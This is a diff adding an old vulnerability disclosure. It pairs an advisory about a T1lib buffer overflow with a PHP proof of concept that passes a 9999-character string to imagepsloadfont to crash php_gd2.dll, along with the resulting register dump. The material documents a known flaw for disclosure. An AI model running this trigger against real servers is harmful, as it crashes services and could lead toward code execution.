@@ -1,0 +1,65 @@
+source: http://www.securityfocus.com/bid/25079/info
+
+T1lib is prone to a buffer-overflow vulnerability because the library fails to perform boundary checks before copying user-supplied data to insufficiently sized memory buffers.
+
+An attacker can exploit this issue to execute arbitrary machine code in the context of applications that use the affected library. Failed exploit attempts will likely trigger crashes, denying service to legitimate users.
+
+We do not know which versions of T1lib are affected. 
+
+<?php
+/*
+PHP imagepsloadfont Buffer Overflow Vulnerability
+
+Discovered & Coded by: r0ut3r (writ3r [at] gmail.com)
+
+Vulnerable dll: php_gd2.dll
+- Tested on WinXP SP0, PHP/5.2.3, Apache 2.2.4
+
+The argument given was A * 9999
+
+Access violation when reading [41414151]
+----------------------------------------
+
+Registers:
+----------
+EAX 77F76238 ntdll.77F76238
+ECX 77C2AB33 MSVCRT.77C2AB33
+EDX 01543260 php_gd2.01543260
+EBX 41414141
+ESP 00C0FD58
+EBP 00C0FD90
+ESI 41414141
+EDI 00222738
+EIP 77F53284 ntdll.77F53284
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 0  CS 001B 32bit 0(FFFFFFFF)
+A 1  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 0038 32bit 7FFDE000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010212 (NO,NB,NE,A,NS,PO,GE,G)
+ST0 empty +UNORM 7D18 00560000 00561378
+ST1 empty +UNORM 2402 0012BCD0 00000001
+ST2 empty +UNORM 17CD 77F516F5 FFFFFFFF
+ST3 empty 0.0889391783750232330e-4933
+ST4 empty +UNORM 0082 0017020C 77D43A5F
+ST5 empty +UNORM 0002 77D489FF 00000000
+ST6 empty 10000.00000000000000
+ST7 empty 10000.00000000000000
+               3 2 1 0      E S P U O Z D I
+FST 4000  Cond 1 0 0 0  Err 0 0 0 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+Proof of concept below: 
+*/
+
+if (!extension_loaded("gd"))
+	die("PHP_GD2 extension not loaded!");
+
+$buff = str_repeat("A",9999);
+
+$res = imagepsloadfont($buff);
+echo "boom!!\n";
+?>
